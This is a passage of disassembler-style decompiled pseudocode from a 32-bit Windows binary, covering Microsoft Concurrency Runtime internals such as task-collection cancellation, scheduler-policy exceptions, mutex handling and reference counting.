std::exception *__thiscall sub_4393DC(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::missing_wait::`vftable';
  return this;
}
// 470EC4: using guessed type void *Concurrency::missing_wait::`vftable';

//----- (004393F7) --------------------------------------------------------
void __thiscall sub_4393F7(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax

  v1 = this[1];
  *this = &Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';
  if ( v1 )
  {
    v2 = (_DWORD *)(v1 - 8);
    if ( *v2 == 56797 )
      j___free_base(v2);
  }
}
// 471194: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';

//----- (0043945B) --------------------------------------------------------
void __thiscall sub_43945B(void **this)
{
  if ( this[2] )
    j_j_j___free_base(this[2]);
}

//----- (0043946B) --------------------------------------------------------
void __thiscall sub_43946B(char *this)
{
  *(_DWORD *)this = &Concurrency::details::_CancellationTokenRegistration::`vftable';
  _Mtx_destroy_in_situ((_Mtx_t)(this + 52));
  _Cnd_destroy_in_situ((_Cnd_t)(this + 12));
  *(_DWORD *)this = &Concurrency::details::_RefCounter::`vftable';
}
// 471168: using guessed type void *Concurrency::details::_RefCounter::`vftable';
// 471174: using guessed type void *Concurrency::details::_CancellationTokenRegistration::`vftable';

//----- (00439490) --------------------------------------------------------
void __thiscall sub_439490(int this)
{
  bool v2; // bl
  _DWORD *v3; // ecx
  _DWORD *v4; // esi
  void *v5; // esi
  void *v6; // esi
  volatile signed __int32 *v7; // ecx
  char pExceptionObject[12]; // [esp+10h] [ebp-18h] BYREF

  v2 = 0;
  if ( !sub_439E22((_DWORD *)this) )
  {
    v2 = !sub_43A118((_DWORD *)this, 0);
    if ( *(_DWORD *)(this + 100) == this )
    {
      v3 = *(_DWORD **)(this + 104);
      if ( v3 )
      {
        do
        {
          v4 = (_DWORD *)v3[26];
          sub_439F90(v3);
          v3 = v4;
        }
        while ( v4 );
      }
    }
  }
  v5 = *(void **)(this + 108);
  if ( v5 )
  {
    sub_43945B(*(void ***)(this + 108));
    sub_42CF7C(v5);
  }
  v6 = (void *)(*(_DWORD *)(this + 24) & 0xFFFFFFFC);
  if ( v6 && v6 != (void *)12 )
  {
    __ExceptionPtrDestroy((void *)(*(_DWORD *)(this + 24) & 0xFFFFFFFC));
    sub_42CF7C(v6);
  }
  v7 = *(volatile signed __int32 **)(this + 8);
  if ( v7 && v7 != (volatile signed __int32 *)2 )
    sub_439F69(v7);
  if ( v2 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVmissing_wait_Concurrency__);
  }
  sub_42EDE2((_DWORD *)(this + 60));
}

//----- (00439571) --------------------------------------------------------
_DWORD *__thiscall sub_439571(_DWORD *Block, char a2)
{
  sub_4393F7(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00439593) --------------------------------------------------------
char *__thiscall sub_439593(char *Block, char a2)
{
  sub_43946B(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (004395B5) --------------------------------------------------------
char *__thiscall sub_4395B5(char *Block, char a2)
{
  sub_43946B(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (004395FA) --------------------------------------------------------
_DWORD *__thiscall sub_4395FA(unsigned int *this, int a2, int a3)
{
  sub_438FB5((int)this, (int)this);
  return sub_436998(this + 32, &a2, &a3);
}

//----- (0043961D) --------------------------------------------------------
_DWORD *__thiscall sub_43961D(unsigned int *this, int a2)
{
  unsigned int *v2; // edi
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  _DWORD *v5; // ecx
  int v7; // [esp+8h] [ebp-4h] BYREF

  v2 = this + 32;
  v3 = sub_435B2A(this + 32, &a2, 0);
  if ( !v3 )
    return 0;
  v4 = (_DWORD *)v3[2];
  v5 = v4;
  if ( v4 && (v4[30] & 2) != 0 )
  {
    v7 = v4[25];
    sub_438A53(v2, &v7, 0);
    sub_439490();
    sub_42CF7C(v4);
    return 0;
  }
  return v5;
}

//----- (0043967D) --------------------------------------------------------
int __thiscall sub_43967D(_DWORD *this)
{
  int v2; // eax

  v2 = this[8];
  if ( !v2 )
  {
    sub_43882B((int)this);
    v2 = this[8];
  }
  return *(_DWORD *)(v2 + 64);
}

//----- (00439694) --------------------------------------------------------
void __thiscall sub_439694(int this, char a2)
{
  volatile __int32 **v3; // eax
  int v4; // ebx
  int v5; // edi
  int i; // eax
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  volatile __int32 *v10; // eax
  int v11; // eax
  volatile __int32 **v12; // [esp+14h] [ebp-4h]

  v3 = (volatile __int32 **)sub_4359BC();
  v4 = *(_DWORD *)(this + 108);
  v12 = v3;
  if ( sub_439E34((_DWORD *)this) )
    v5 = 0;
  else
    v5 = *(_DWORD *)(*(_DWORD *)(this + 100) + 104);
  if ( v4 && *(_BYTE *)(v4 + 12) )
  {
    sub_4397C3((void *)this, v12);
    *(_BYTE *)(v4 + 12) = 0;
  }
  else
  {
    for ( i = *(_DWORD *)(this + 132); i > 0; i = *(_DWORD *)(this + 132) )
    {
      if ( (unsigned int)i <= 2 )
      {
        v7 = *(_DWORD *)(this + 4 * i + 108);
      }
      else
      {
        --*(_DWORD *)(v4 + 4);
        v7 = *(_DWORD *)(*(_DWORD *)(v4 + 8) + 4 * *(_DWORD *)(v4 + 4));
        i = *(_DWORD *)(this + 132);
      }
      *(_DWORD *)(this + 132) = i - 1;
      v8 = sub_4391DD(v12, v7);
      v9 = v8;
      if ( !v8 )
        break;
      if ( v8 != 1 )
      {
        v10 = v12[39];
        if ( *((_BYTE *)v12 + 76) )
          ++*((_DWORD *)v10 + 3);
        else
          ++*((_DWORD *)v10 + 27);
        *(_DWORD *)(v9 + 8) = 0;
        sub_439E59(this, v9);
      }
    }
  }
  while ( 1 )
  {
    if ( a2 || *(int *)(this + 16) > 0 || sub_439E22((_DWORD *)this) || v5 )
      sub_4398DC(*(volatile __int32 **)(this + 100), 0, v5);
    sub_439C1C((_DWORD ***)this, v5);
    v11 = sub_439E34((_DWORD *)this) ? 0 : *(_DWORD *)(*(_DWORD *)(this + 100) + 104);
    if ( v5 == v11 )
      break;
    v5 = v11;
  }
  *(_DWORD *)(this + 132) = 0;
  if ( v4 )
    *(_DWORD *)(v4 + 4) = 0;
  if ( !a2 )
    sub_439FCA(this, v5);
}

//----- (004397C3) --------------------------------------------------------
int __thiscall sub_4397C3(void *this, volatile __int32 **a2)
{
  int result; // eax
  _BYTE *v3; // eax
  bool v4; // zf
  int v5; // ecx
  void *v6; // [esp+0h] [ebp-8h] BYREF
  int v7; // [esp+4h] [ebp-4h]

  v7 = 0;
  v6 = this;
  result = sub_439037(
             a2,
             (unsigned __int8 (__cdecl *)(int, int))sub_439ACE,
             (int)&v6,
             (int (__cdecl *)(int, int))sub_43A0FF);
  if ( v7 )
  {
    v3 = sub_4359BC();
    v4 = v3[76] == 0;
    v5 = *((_DWORD *)v3 + 39);
    result = v7;
    if ( v4 )
      *(_DWORD *)(v5 + 108) += v7;
    else
      *(_DWORD *)(v5 + 12) += v7;
  }
  return result;
}

//----- (0043980B) --------------------------------------------------------
volatile __int32 *__thiscall sub_43980B(_DWORD *this)
{
  unsigned int *v2; // ebx
  int v3; // eax
  volatile __int32 *result; // eax
  volatile __int32 *v5; // eax
  volatile __int32 *v6; // edi

  v2 = (unsigned int *)sub_42E59B();
  v3 = sub_43967D(v2);
  if ( v2 == (unsigned int *)this[3] && v3 == this[32] )
    return this;
  result = (volatile __int32 *)sub_438AF5(v2);
  if ( !result || *((_DWORD **)result + 25) != this )
  {
    result = sub_43961D(v2, (int)this);
    if ( !result )
    {
      v5 = (volatile __int32 *)operator new(0x90u);
      v6 = 0;
      if ( v5 )
        v6 = sub_4392FB(v5, (int)this, 1);
      sub_4395FA(v2, (int)this, (int)v6);
      return v6;
    }
  }
  return result;
}
// 42E59B: using guessed type int sub_42E59B(void);

//----- (0043988C) --------------------------------------------------------
void __thiscall sub_43988C(int this)
{
  int v2; // ecx

  if ( !*(_DWORD *)(this + 12) )
    *(_DWORD *)(this + 12) = sub_42E59B();
  if ( sub_44143F((volatile signed __int32 *)this) )
  {
    v2 = *(_DWORD *)(this + 12);
    if ( (16 * *(_DWORD *)(this + 4)) >> 4 < 0 )
    {
      _InterlockedIncrement((volatile signed __int32 *)(v2 + 120));
      sub_4413F1((volatile signed __int32 *)this, 2);
    }
    else
    {
      sub_4385C2(v2, (16 * *(_DWORD *)(this + 4)) >> 4);
      sub_4413F1((volatile signed __int32 *)this, 3);
    }
    sub_438659(*(_DWORD *)(this + 12), this);
  }
}

//----- (004398DC) --------------------------------------------------------
void __thiscall sub_4398DC(volatile __int32 *this, int a2, int a3)
{
  volatile __int32 *v4; // edi
  int v5; // edi
  volatile __int32 *v6; // ebx
  volatile __int32 v7; // edi
  volatile __int32 **v8; // [esp+8h] [ebp-4h]

  v4 = sub_43980B(this);
  if ( sub_43A0C5(this, 1) )
  {
    if ( sub_439E34(v4) || v4 == this )
    {
      v6 = this + 14;
      do
      {
        while ( 1 )
        {
          v7 = *v6;
          if ( *v6 != 1 && v7 != 5 )
            break;
          v8 = (volatile __int32 **)*((_DWORD *)this + 3);
          sub_4385C2((int)v8, (16 * *((_DWORD *)this + 1)) >> 4);
          if ( v7 == 5 )
            sub_4397C3((void *)this, v8);
          _InterlockedExchange(v6, 4);
        }
      }
      while ( _InterlockedCompareExchange(v6, 3, 0) != v7 );
      v5 = a2;
      sub_439A3E((int)this, a2, 1);
    }
    else
    {
      v5 = a2;
      sub_43999A(this, a2);
    }
    sub_43997B(v5, a3);
  }
}

//----- (0043997B) --------------------------------------------------------
void __stdcall sub_43997B(int a1, int a2)
{
  while ( a2 )
  {
    sub_43999A((volatile signed __int32 *)a2, a1);
    a2 = *(_DWORD *)(a2 + 104);
  }
}

//----- (0043999A) --------------------------------------------------------
void __thiscall sub_43999A(volatile signed __int32 *this, int a2)
{
  signed __int32 v2; // esi
  char v3; // bl
  signed __int32 v4; // edx
  signed __int32 v5; // eax
  int v6; // ecx
  int v7; // [esp-4h] [ebp-20h]
  volatile __int32 **v8; // [esp+Ch] [ebp-10h]
  volatile signed __int32 *v9; // [esp+10h] [ebp-Ch]
  char v10; // [esp+14h] [ebp-8h]

  v2 = *((_DWORD *)this + 14);
  v3 = 0;
  v9 = this + 14;
  v4 = 0;
  while ( 1 )
  {
    if ( !v2 )
    {
      v7 = 3;
      goto LABEL_9;
    }
    if ( v2 == 1 || v2 == 5 )
    {
      v7 = 9;
LABEL_9:
      v4 = v7;
      goto LABEL_10;
    }
    if ( !v4 )
      return;
LABEL_10:
    v5 = _InterlockedCompareExchange(v9, v4, v2);
    v6 = (int)this;
    v4 = v5;
    if ( v5 == v2 )
      break;
    v2 = v5;
  }
  v10 = 0;
  if ( v2 == 1 || v2 == 5 )
  {
    v3 = 1;
    v10 = 1;
    v8 = (volatile __int32 **)*((_DWORD *)this + 3);
    sub_4385C2((int)v8, (16 * *((_DWORD *)this + 1)) >> 4);
    v6 = (int)this;
    if ( v2 == 5 )
    {
      sub_4397C3((void *)this, v8);
      v6 = (int)this;
    }
  }
  sub_439A3E(v6, a2, v10);
  if ( v3 )
    _InterlockedExchange(v9, 4);
}

//----- (00439A3E) --------------------------------------------------------
void __thiscall sub_439A3E(int this, int a2, char a3)
{
  int *v4; // ebx
  int v5; // eax
  int i; // edi
  volatile signed __int32 *v7; // [esp+14h] [ebp-10h]

  v4 = (int *)(this + 28);
  v7 = (volatile signed __int32 *)(this + 32);
  sub_42E763((volatile signed __int32 *)(this + 32));
  if ( a3 )
    goto LABEL_4;
  if ( *(int *)(this + 48) <= 0 )
    goto LABEL_5;
  v5 = *v4;
  if ( !*v4 )
  {
LABEL_4:
    sub_438659(*(_DWORD *)(this + 12), this);
LABEL_5:
    v5 = *v4;
    if ( !*v4 )
      goto LABEL_9;
  }
  for ( i = *(_DWORD *)(v5 + 4); i; i = *(_DWORD *)(i + 4) )
  {
    _InterlockedExchange((volatile __int32 *)(i + 24), 1);
    sub_4385C2(i - 92, -999);
    sub_438659(i - 92, 0);
    if ( i == *v4 )
      break;
  }
LABEL_9:
  sub_42E8A9(v7);
}

//----- (00439ACE) --------------------------------------------------------
bool __cdecl sub_439ACE(int a1, _DWORD *a2)
{
  return *(_DWORD *)(a1 + 8) == *a2;
}

//----- (00439AE1) --------------------------------------------------------
signed __int32 __thiscall sub_439AE1(int this)
{
  volatile signed __int32 *v2; // edi
  signed __int32 result; // eax

  v2 = (volatile signed __int32 *)(this + 20);
  if ( *(_DWORD *)(this + 20) == 0x80000000 || *(_DWORD *)(this + 20) == -2147483647 )
    sub_439D28(this);
  result = _InterlockedIncrement(v2);
  if ( !result )
    return sub_42F20C((volatile signed __int32 *)(this + 28));
  return result;
}

//----- (00439B0F) --------------------------------------------------------
int __thiscall sub_439B0F(int this, int a2)
{
  struct _Mtx_internal_imp_t *v3; // esi
  int v4; // eax
  int v5; // eax
  int result; // eax
  int v7; // esi
  int v8; // eax
  _Mtx_t v9; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+14h] [ebp-14h]
  int v11; // [esp+18h] [ebp-10h]
  int v12; // [esp+24h] [ebp-4h]

  v3 = (struct _Mtx_internal_imp_t *)(this + 12);
  v11 = 0;
  v10 = this + 12;
  v4 = _Mtx_lock((_Mtx_t)(this + 12));
  std::_Check_C_return(v4);
  v12 = 0;
  if ( *(_DWORD *)(this + 60) )
  {
    sub_43A1A8((_DWORD *)(this + 60), a2);
    _InterlockedExchange((volatile __int32 *)(a2 + 8), 2);
    sub_439F69((volatile signed __int32 *)a2);
  }
  else
  {
    LOBYTE(v11) = 1;
  }
  v5 = _Mtx_unlock(v3);
  result = std::_Check_C_return(v5);
  v12 = -1;
  if ( (_BYTE)v11 )
  {
    result = _InterlockedCompareExchange((volatile signed __int32 *)(a2 + 8), 1, 0);
    v7 = result;
    if ( result )
    {
      if ( result <= 0 || result >= 4 )
      {
        result = GetCurrentThreadId();
        if ( v7 != result )
        {
          result = _InterlockedExchange((volatile __int32 *)(a2 + 8), 2);
          if ( result != 3 )
          {
            std::unique_lock<std::mutex>::unique_lock<std::mutex>((_Mtx_t)(a2 + 52));
            v12 = 2;
            result = sub_439200((void *)(a2 + 12), &v9, a2);
            v12 = 3;
            if ( (_BYTE)v10 )
            {
              v8 = _Mtx_unlock(v9);
              return std::_Check_C_return(v8);
            }
          }
        }
      }
    }
  }
  return result;
}

//----- (00439BEB) --------------------------------------------------------
int __thiscall sub_439BEB(int (__thiscall ***this)(void *, int))
{
  int result; // eax

  if ( this )
    return (**this)(this, 1);
  return result;
}

//----- (00439C08) --------------------------------------------------------
int __thiscall sub_439C08(int this)
{
  return (*(int (__cdecl **)(_DWORD))(this + 108))(*(_DWORD *)(this + 112));
}

//----- (00439C1C) --------------------------------------------------------
void __thiscall sub_439C1C(_DWORD ***this, int a2)
{
  int v2; // ebx
  int v3; // eax
  int v4; // edi
  unsigned int v5; // ecx
  unsigned int v6; // eax
  void *v7; // esp
  _DWORD *v8; // esi
  _DWORD *v9; // eax
  _DWORD *v10; // esi
  int v11; // ecx
  signed int v12; // edi
  _DWORD *v13; // esi
  _DWORD v14[4]; // [esp+0h] [ebp-3Ch] BYREF
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-2Ch] BYREF
  _DWORD *v16; // [esp+20h] [ebp-1Ch]
  int v17; // [esp+24h] [ebp-18h]
  _DWORD ***v18; // [esp+28h] [ebp-14h]
  int v19; // [esp+38h] [ebp-4h]

  v18 = this;
  v2 = a2;
  v3 = a2;
  v4 = 0;
  if ( !a2 )
    goto LABEL_15;
  do
  {
    v3 = *(_DWORD *)(v3 + 104);
    ++v4;
  }
  while ( v3 );
  if ( v4 <= 0 )
  {
LABEL_15:
    sub_42F787(this + 15, 0xFFFFFFFF);
    return;
  }
  pExceptionObject[3] = &Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';
  v16 = 0;
  v17 = 0;
  v19 = 0;
  v5 = 4 * v4 + 12;
  v6 = 4 * v4 + 4 < v5 ? v5 : 0;
  if ( !v6 )
    goto LABEL_17;
  if ( v6 > 0x400 )
  {
    v9 = malloc(4 * v4 + 4 < v5 ? v5 : 0);
    v8 = v9;
    if ( !v9 )
      goto LABEL_17;
    *v9 = 56797;
  }
  else
  {
    v7 = alloca(v6);
    v8 = v14;
    if ( !v14 )
      goto LABEL_17;
    v14[0] = 52428;
  }
  v10 = v8 + 2;
  if ( !v10 )
  {
LABEL_17:
    sub_4295F3(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  v17 = 0;
  v11 = 1;
  v16 = v10;
  v12 = v4 + 1;
  *v10 = v18[25] + 15;
  if ( v12 > 1 )
  {
    do
    {
      v10[v11++] = v2 + 60;
      v2 = *(_DWORD *)(v2 + 104);
    }
    while ( v11 < v12 );
  }
  sub_42F950(v10, v12, 1, 0xFFFFFFFF);
  v13 = v10 - 2;
  if ( *v13 == 56797 )
    j___free_base(v13);
}
// 471194: using guessed type void *Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable';

//----- (00439D24) --------------------------------------------------------
char *__thiscall sub_439D24(char *this)
{
  return this + 28;
}

//----- (00439D28) --------------------------------------------------------
char __thiscall sub_439D28(int this)
{
  volatile __int32 *v1; // esi
  signed __int32 v2; // eax
  char v4[8]; // [esp+Ch] [ebp-10h] BYREF
  int v5; // [esp+14h] [ebp-8h]
  int (*v6)(); // [esp+18h] [ebp-4h]

  v1 = (volatile __int32 *)(this + 20);
  v2 = _InterlockedCompareExchange((volatile signed __int32 *)(this + 20), -2147483647, 0x80000000);
  if ( v2 == 0x80000000 )
  {
    *(_DWORD *)(this + 28) = 0;
    LOBYTE(v2) = _InterlockedExchange(v1, 0);
  }
  else
  {
    v5 = 0;
    v6 = sub_43055D;
    while ( *(int *)v1 <= -2147483647 )
      LOBYTE(v2) = sub_42E8F5((int)v4);
  }
  return v2;
}
// 439D28: using guessed type char var_10[8];

//----- (00439D73) --------------------------------------------------------
_DWORD *__thiscall sub_439D73(_DWORD *this)
{
  this[12] = 0;
  this[13] = 0;
  this[31] = 0;
  this[7] = 0;
  return sub_42E462(this + 8);
}

//----- (00439D89) --------------------------------------------------------
signed __int32 __thiscall sub_439D89(volatile signed __int32 *this)
{
  signed __int32 CurrentThreadId; // ebx
  signed __int32 v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax

  CurrentThreadId = GetCurrentThreadId();
  if ( !_InterlockedCompareExchange(this + 2, CurrentThreadId, 0) )
  {
    (*(void (__thiscall **)(volatile signed __int32 *))(*this + 8))(this);
    v3 = _InterlockedCompareExchange(this + 2, 3, CurrentThreadId);
    if ( v3 != CurrentThreadId )
      CurrentThreadId = v3;
    if ( CurrentThreadId == 2 )
    {
      v4 = _Mtx_lock((_Mtx_t)(this + 13));
      std::_Check_C_return(v4);
      *((_BYTE *)this + 100) = 1;
      v5 = _Mtx_unlock((_Mtx_t)(this + 13));
      std::_Check_C_return(v5);
      v6 = _Cnd_broadcast((_Cnd_t)(this + 3));
      std::_Check_C_return(v6);
    }
  }
  return sub_439F69(this);
}

//----- (00439E22) --------------------------------------------------------
bool __thiscall sub_439E22(_DWORD *this)
{
  return (_DWORD *)this[25] != this && (this[30] & 1) == 0;
}

//----- (00439E34) --------------------------------------------------------
bool __thiscall sub_439E34(_DWORD *this)
{
  return (_DWORD *)this[25] != this && (this[30] & 1) != 0;
}

//----- (00439E46) --------------------------------------------------------
bool __thiscall sub_439E46(_DWORD *this)
{
  return *(_DWORD *)(this[25] + 52) != 0;
}

//----- (00439E51) --------------------------------------------------------
bool __thiscall sub_439E51(_DWORD *this)
{
  return (this[30] & 2) != 0;
}

//----- (00439E59) --------------------------------------------------------
void __thiscall sub_439E59(int this, int a2)
{
  void (__cdecl *v3)(int); // edi
  int v4; // ebx

  if ( *(_BYTE *)(a2 + 16) )
    sub_441985((int (__thiscall ***)(_DWORD, int))a2);
  v3 = *(void (__cdecl **)(int))(this + 136);
  v4 = *(_DWORD *)(this + 140);
  if ( !_InterlockedDecrement((volatile signed __int32 *)(this + 16)) )
    sub_42F5DA((volatile __int32 *)(this + 60));
  if ( v3 )
    v3(v4);
}

//----- (00439EA8) --------------------------------------------------------
int __thiscall sub_439EA8(_DWORD *this)
{
  return this[25];
}

//----- (00439EAC) --------------------------------------------------------
int __thiscall sub_439EAC(void *this, int a2, int a3, int a4)
{
  void *v5; // eax
  int v6; // esi

  v5 = operator new(0x74u);
  if ( v5 )
    v6 = sub_43925B((int)v5, a2, a3, a4);
  else
    v6 = 0;
  sub_439EE9((int)this, v6);
  return v6;
}

//----- (00439EE9) --------------------------------------------------------
int __thiscall sub_439EE9(int this, int a2)
{
  char v3; // bl
  int v4; // eax
  int v5; // eax
  int result; // eax

  _InterlockedExchange((volatile __int32 *)(a2 + 8), 0);
  _InterlockedIncrement((volatile signed __int32 *)(a2 + 4));
  *(_DWORD *)(a2 + 104) = this;
  v3 = 1;
  if ( *(_DWORD *)(this + 8) )
    return sub_439D89((volatile signed __int32 *)a2);
  v4 = _Mtx_lock((_Mtx_t)(this + 12));
  std::_Check_C_return(v4);
  if ( !*(_DWORD *)(this + 8) )
  {
    v3 = 0;
    sub_43A16C((_DWORD *)(this + 60), a2);
  }
  v5 = _Mtx_unlock((_Mtx_t)(this + 12));
  result = std::_Check_C_return(v5);
  if ( v3 )
    return sub_439D89((volatile signed __int32 *)a2);
  return result;
}

//----- (00439F69) --------------------------------------------------------
signed __int32 __thiscall sub_439F69(volatile signed __int32 *this)
{
  signed __int32 v1; // edi

  v1 = _InterlockedDecrement(this + 1);
  if ( !v1 )
    (*(void (__thiscall **)(volatile signed __int32 *))(*this + 4))(this);
  return v1;
}

//----- (00439F90) --------------------------------------------------------
void __thiscall sub_439F90(volatile signed __int32 *Block)
{
  volatile signed __int32 *v2; // edi
  signed __int32 v3; // ecx
  signed __int32 v4; // eax

  v2 = Block + 30;
  v3 = *((_DWORD *)Block + 30);
  if ( (v3 & 2) != 0 )
  {
LABEL_4:
    sub_439490((int)Block);
    sub_42CF7C((void *)Block);
  }
  else
  {
    while ( 1 )
    {
      v4 = _InterlockedCompareExchange(v2, v3 | 2, v3);
      if ( v4 == v3 )
        break;
      v3 = v4;
      if ( (v4 & 2) != 0 )
        goto LABEL_4;
    }
  }
}

//----- (00439FCA) --------------------------------------------------------
void __thiscall sub_439FCA(int this, int a2)
{
  int v2; // edi
  volatile signed __int32 *v4; // eax
  int v5; // ecx
  volatile signed __int32 *v6; // ebx
  signed __int32 v7; // edx
  signed __int32 v8; // eax
  char v9[8]; // [esp+Ch] [ebp-28h] BYREF
  int v10; // [esp+14h] [ebp-20h]
  int (*v11)(); // [esp+18h] [ebp-1Ch]
  char v12[8]; // [esp+1Ch] [ebp-18h] BYREF
  int v13; // [esp+24h] [ebp-10h]
  int (*v14)(); // [esp+28h] [ebp-Ch]
  int v15; // [esp+2Ch] [ebp-8h]
  volatile signed __int32 *v16; // [esp+30h] [ebp-4h]

  v2 = a2;
  while ( 2 )
  {
    v4 = (volatile signed __int32 *)sub_4359BC();
    v5 = *(_DWORD *)(this + 12);
    v6 = (volatile signed __int32 *)(this + 56);
    v16 = v4;
    v15 = v5;
LABEL_3:
    v7 = *v6;
    while ( 1 )
    {
      if ( v7 == 9 )
      {
        v13 = 0;
        v14 = sub_43055D;
        if ( *v6 == 9 )
        {
          do
            sub_42E8F5((int)v12);
          while ( *v6 == 9 );
          v4 = v16;
          v5 = v15;
        }
        goto LABEL_3;
      }
      if ( v4 == (volatile signed __int32 *)v5 )
        break;
      v8 = _InterlockedCompareExchange(v6, 0, 3);
      if ( v8 != 9 )
        goto LABEL_13;
LABEL_18:
      v5 = v15;
      v7 = v8;
      v4 = v16;
    }
    v8 = _InterlockedCompareExchange(v6, 0, v7);
    if ( v8 != v7 )
      goto LABEL_18;
    if ( v8 == 4 )
      sub_438629(v16, (16 * *(_DWORD *)(this + 4)) >> 4);
    *(_DWORD *)(this + 4) |= 0xFFFFFFFu;
LABEL_13:
    if ( *(_DWORD *)(this + 100) == this )
    {
      while ( v2 )
      {
        if ( (*(_DWORD *)(v2 + 120) & 2) == 0 )
          sub_439FCA(0);
        v2 = *(_DWORD *)(v2 + 104);
      }
      if ( _InterlockedExchange((volatile __int32 *)(this + 52), 0) < 0 )
      {
        v10 = 0;
        v11 = sub_43055D;
        while ( *(_DWORD *)(this + 24) == 8 )
          sub_42E8F5((int)v9);
        sub_4414C5((_DWORD *)this);
      }
    }
    else if ( sub_439E22((_DWORD *)this) && a2 )
    {
      this = *(_DWORD *)(this + 100);
      continue;
    }
    break;
  }
}
// 439FCA: using guessed type char var_18[8];
// 439FCA: using guessed type char var_28[8];

//----- (0043A0C5) --------------------------------------------------------
char __thiscall sub_43A0C5(volatile signed __int32 *this, int a2)
{
  signed __int32 v2; // edx
  signed __int32 v3; // eax

  v2 = *((_DWORD *)this + 13);
  if ( (v2 & 0x3FFFFFFF) != 0 )
    return 0;
  while ( 1 )
  {
    v3 = _InterlockedCompareExchange(this + 13, a2 | v2 & 0xC0000000, v2);
    if ( v3 == v2 )
      break;
    v2 = v3;
    if ( (v3 & 0x3FFFFFFF) != 0 )
      return 0;
  }
  return 1;
}

//----- (0043A0FF) --------------------------------------------------------
char __cdecl sub_43A0FF(int a1, int a2)
{
  int v2; // ecx

  v2 = *(_DWORD *)(a1 + 8);
  ++*(_DWORD *)(a2 + 4);
  sub_439E59(v2, a1);
  return 1;
}

//----- (0043A118) --------------------------------------------------------
bool __thiscall sub_43A118(_DWORD *this, char a2)
{
  bool v3; // bl
  int i; // eax
  bool v5; // zf

  v3 = 0;
  if ( sub_439E22(this) )
    return !v3;
  if ( (unsigned __int8)__uncaught_exception() )
    goto LABEL_10;
  v3 = this[4] > 0;
  if ( (_DWORD *)this[25] == this )
  {
    for ( i = this[26]; i; i = *(_DWORD *)(i + 104) )
    {
      if ( *(int *)(i + 16) > 0 )
        v3 = 1;
    }
  }
  v5 = !v3;
  if ( v3 )
  {
LABEL_10:
    sub_439694((int)this, a2);
    return !v3;
  }
  return v5;
}
// 44658E: using guessed type int __uncaught_exception(void);

//----- (0043A16C) --------------------------------------------------------
_DWORD *__thiscall sub_43A16C(_DWORD *this, int a2)
{
  _DWORD *result; // eax
  _DWORD *v4; // edx

  result = operator new(8u);
  v4 = result;
  if ( result )
  {
    result[1] = 0;
    *result = a2;
  }
  else
  {
    v4 = 0;
  }
  if ( *this )
  {
    result = (_DWORD *)this[1];
    result[1] = v4;
  }
  else
  {
    *this = v4;
  }
  this[1] = v4;
  return result;
}

//----- (0043A1A8) --------------------------------------------------------
void __thiscall sub_43A1A8(_DWORD *this, int a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // edx
  int v4; // esi

  v2 = (_DWORD *)*this;
  v3 = 0;
  if ( *this )
  {
    while ( 1 )
    {
      v4 = v2[1];
      if ( *v2 == a2 )
        break;
      v3 = v2;
      v2 = (_DWORD *)v2[1];
      if ( !v4 )
        return;
    }
    if ( v3 )
      v3[1] = v4;
    else
      *this = v4;
    if ( !v2[1] )
      this[1] = v3;
    sub_42CF7C(v2);
  }
}

//----- (0043A1ED) --------------------------------------------------------
_DWORD *__cdecl sub_43A1ED(_DWORD *a1, unsigned int a2, char a3)
{
  char *v4; // [esp+0h] [ebp-4h] BYREF

  v4 = &a3;
  sub_43A2FC(a1, a2, (int *)&v4);
  return a1;
}

//----- (0043A20B) --------------------------------------------------------
_DWORD *__thiscall sub_43A20B(_DWORD *this, const void **a2)
{
  void *v3; // edi
  _DWORD *result; // eax

  v3 = operator new(0x28u);
  *this = v3;
  result = this;
  qmemcpy(v3, *a2, 0x28u);
  return result;
}

//----- (0043A232) --------------------------------------------------------
std::exception *__thiscall sub_43A232(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_key::`vftable';
  return this;
}
// 470ED0: using guessed type void *Concurrency::invalid_scheduler_policy_key::`vftable';

//----- (0043A24D) --------------------------------------------------------
std::exception *__thiscall sub_43A24D(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_thread_specification::`vftable';
  return this;
}
// 470EE8: using guessed type void *Concurrency::invalid_scheduler_policy_thread_specification::`vftable';

//----- (0043A268) --------------------------------------------------------
std::exception *__thiscall sub_43A268(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_scheduler_policy_value::`vftable';
  return this;
}
// 470EDC: using guessed type void *Concurrency::invalid_scheduler_policy_value::`vftable';

//----- (0043A283) --------------------------------------------------------
void __thiscall sub_43A283(void **this)
{
  sub_42CF7C(*this);
}

//----- (0043A28F) --------------------------------------------------------
void **__thiscall sub_43A28F(void **this, const void **a2)
{
  void **result; // eax

  result = this;
  qmemcpy(*this, *a2, 0x28u);
  return result;
}

//----- (0043A2A8) --------------------------------------------------------
int __thiscall sub_43A2A8(_DWORD *this, unsigned int a2)
{
  char *v3; // eax
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  if ( a2 > 9 )
  {
    v3 = sub_43A42D(a2);
    sub_4305F4((std::exception *)pExceptionObject, v3);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_scheduler_policy_key_Concurrency__);
  }
